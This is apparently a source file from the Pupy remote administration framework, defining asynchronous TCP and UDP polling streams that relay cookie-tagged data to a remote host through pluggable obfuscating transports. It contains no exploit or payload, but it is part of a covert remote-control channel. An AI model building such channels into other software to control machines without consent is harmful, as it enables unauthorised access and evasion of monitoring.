# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
""" abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """

__all__=["PupyAsyncTCPStream", "PupyAsyncUDPStream"]

from rpyc.core.stream import Stream
from ..buffer import Buffer
import sys, socket, time, errno, logging, traceback, string, random
from rpyc.lib.compat import select, select_error, BYTES_LITERAL, get_exc_errno, maxint
from PupySocketStream import addGetPeer
try:
    import multiprocessing
    Process=multiprocessing.Process
    Lock=multiprocessing.Lock
    Event=multiprocessing.Event
except ImportError: #multiprocessing not available on android ?
    import threading
    Process=threading.Thread
    Lock=threading.Lock
    Event=threading.Event


class addGetPeer(object):
    """ add some functions needed by some obfsproxy transports"""
    def __init__(self, peer):
        self.peer=peer
    def getPeer(self):
        return self.peer

def monitor(st):
    while True:
        print "upstream: %s %s"%(len(st.upstream),repr(st.upstream.peek()))
        print "downstream: %s %s"%(len(st.downstream), repr(st.downstream.peek()))
        print "buf_in: %s %s"%(len(st.buf_in), st.buf_in.peek())
        print "buf_out: %s %s"%(len(st.buf_out), st.buf_out.peek())
        time.sleep(3)


class PupyAsyncStream(Stream):
    """ Pupy asynchrone stream implementation """
    def __init__(self, dstconf, transport_class, transport_kwargs):
        super(PupyAsyncStream, self).__init__()
        self.active=True
        #buffers for streams
        self.buf_in=Buffer()
        self.buf_out=Buffer()
        self.buf_tmp=Buffer()
        self.cookie=''.join(random.SystemRandom().choice("abcdef0123456789") for _ in range(32))
        self.buf_in.cookie=self.cookie
        self.buf_out.cookie=self.cookie
        self.buf_tmp.cookie=self.cookie
        #buffers for transport
        self.upstream=Buffer(transport_func=addGetPeer(("127.0.0.1", 443)))
        self.downstream=Buffer(transport_func=addGetPeer(("127.0.0.1", 443)))
        self.upstream_lock=Lock()
        self.downstream_lock=Lock()
        self.transport=transport_class(self, **transport_kwargs)

        self.max_pull_interval=2
        self.pull_interval=0
        self.pull_event=Event()
        self.MAX_IO_CHUNK=32000*100 #3Mo because it is a async transport

        self.client_side=self.transport.client
        if self.client_side:
            self.poller_thread=Process(target=self.poller_loop)
            self.poller_thread.daemon=True
            self.poller_thread.start()
        self.on_connect()

    def on_connect(self):
        self.transport.on_connect()

    def close(self):
        """closes the stream, releasing any system resources associated with it"""
        print "closing stream !"
        self.active=False
        self.buf_in.cookie=None
        self.buf_out.cookie=None

    @property
    def closed(self):
        """tests whether the stream is closed or not"""
        return not self.active

    def fileno(self):
        """returns the stream's file descriptor"""
        raise NotImplementedError()

    def poll(self, timeout):
        """indicates whether the stream has data to read (within *timeout*
        seconds)"""
        return (len(self.upstream) > 0) or self.closed

    def read(self, count):
        try:
            #print "reading :%s"%count
            while True:
                #with self.downstream_lock: #because downstream write in upstream
                if not self.active:
                    raise EOFError("connexion closed")
                if len(self.upstream)>=count:
                    if not self.active:
                        raise EOFError("connexion closed")
                    #print "%s read upstream !"%count
                    return self.upstream.read(count)
                self.pull()
                time.sleep(0.01)

                #it seems we can actively wait here with only perf enhancement
                #if len(self.upstream)<count:
                #    self.upstream.wait(0.1)#to avoid active wait

        except Exception as e:
            logging.debug(traceback.format_exc())

    def pull_data(self, data):
        """
        function called at each "tick" (poll interval). It takes the data to send, send it with a unique cookie, and must return the obfuscated data retrieved.
        """
        raise NotImplementedError()

    def pull(self):
        """ make a pull if we are on the client side, else do nothing """
        if not self.client_side:
            return
        self.pull_interval=0
        self.pull_event.set()

    def poller_loop(self):
        empty_message=None
        while self.active:
            try:
                data_to_send=None
                if len(self.downstream)>0:
                    with self.upstream_lock:
                        data_to_send=self.downstream.read()
                else:
                    if empty_message is None :
                        #no data, let's generate an empty encoded message to pull
                        self.buf_tmp.drain()
                        self.transport.upstream_recv(self.buf_tmp)
                        empty_message=self.downstream.read()
                    data_to_send=empty_message

                received_data=b""
                try:
                    received_data=self.pull_data(data_to_send)
                except IOError as e:
                    print "IOError: %s"%e
                    print "closing connection"
                    self.close()

                with self.downstream_lock:
                    if received_data:
                        self.buf_in.write(received_data)
                        self.transport.downstream_recv(self.buf_in)
                if not self.pull_event.wait(self.pull_interval): #then timeout
                    self.pull_interval+=0.01
                    if self.pull_interval>self.max_pull_interval:
                        self.pull_interval=self.max_pull_interval
                #print "pull interval: %s"%self.pull_interval
                self.pull_event.clear()
            except Exception as e:
                logging.debug(traceback.format_exc())
                time.sleep(self.pull_interval)

    def write(self, data):
        if not self.active:
            raise EOFError("connexion closed")
        with self.upstream_lock:
            self.buf_out.write(data)
            self.transport.upstream_recv(self.buf_out)
        self.pull()

class PupyAsyncTCPStream(PupyAsyncStream):
    def __init__(self, dstconf, transport_class, transport_kwargs={}):
        self.hostname=dstconf[0]
        self.port=dstconf[1]
        super(PupyAsyncTCPStream, self).__init__(dstconf, transport_class, transport_kwargs)

    def pull_data(self, data):
        s = None
        last_exc=None
        for res in socket.getaddrinfo(self.hostname, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                s = socket.socket(af, socktype, proto)
            except socket.error as msg:
                s = None
                last_exc=msg
                continue
            try:
                s.connect(sa)
            except socket.error as msg:
                s.close()
                s = None
                last_exc=msg
                continue
            break
        if s is None:
            raise last_exc
        #print "sending %s"%repr(data)
        s.sendall(data)
        total_received=b""
        #print "receiving ..."
        s.settimeout(15)
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                total_received+=data
            except socket.timeout:
                break

        #print "received: %s"%repr(total_received)
        s.close()
        return total_received

class PupyAsyncUDPStream(PupyAsyncStream):
    def __init__(self, dstconf, transport_class, transport_kwargs={}):
        self.hostname=dstconf[0]
        self.port=dstconf[1]
        super(PupyAsyncUDPStream, self).__init__(dstconf, transport_class, transport_kwargs)

    def pull_data(self, data):
        s = None
        last_exc=None
        for res in socket.getaddrinfo(self.hostname, self.port, socket.AF_UNSPEC, socket.SOCK_DGRAM):
            af, socktype, proto, canonname, sa = res
            try:
                s = socket.socket(af, socktype, proto)
            except socket.error as msg:
                s = None
                last_exc=msg
                continue
            try:
                s.connect(sa)
            except socket.error as msg:
                s.close()
                s = None
                last_exc=msg
                continue
            break
        if s is None:
            raise last_exc
        #print "sending %s"%repr(data)
        s.sendall(data)
        total_received=b""
        #print "receiving ..."
        s.settimeout(15)
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                total_received+=data
            except socket.timeout:
                break

        #print "received: %s"%repr(total_received)
        s.close()
        return total_received
